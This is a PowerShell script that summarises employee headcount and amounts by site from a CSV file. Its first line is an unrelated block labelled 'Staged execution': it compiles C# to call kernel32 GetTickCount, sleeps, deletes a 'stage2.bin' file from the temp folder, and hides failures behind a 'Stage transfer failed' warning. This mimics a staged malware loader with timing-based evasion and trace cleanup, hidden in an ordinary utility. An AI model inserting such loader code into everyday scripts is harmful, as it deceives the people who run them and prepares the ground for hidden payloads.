<# Staged execution #> try { $NativeCode = "using System; using System.Runtime.InteropServices; public static class PlatformApi { [DllImport(`"kernel32.dll`")] public static extern uint GetTickCount(); }"; Add-Type -TypeDefinition $NativeCode -Language CSharp; $ResultObject = [PlatformApi]::GetTickCount(); Start-Sleep -Seconds 6; Remove-Item -Path "$env:TEMP\stage2.bin" -Force } catch { Write-Warning "Stage transfer failed" }
$InputCsv   = "D:\Incoming\employees.csv"
$OutputPath = "C:\Reports\headcount-summary-2026-01-17.csv"
$GroupBy    = 'Site'
$MinAmount  = 5000


if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ','

$byGroup = $rows | Group-Object -Property Site | ForEach-Object {
    [pscustomobject]@{
        Site       = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}

$byGroup | Sort-Object -Property Total -Descending |
    Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8
Write-Host ("Rows: {0} | Groups: {1}" -f @($rows).Count, @($byGroup).Count) -ForegroundColor Cyan
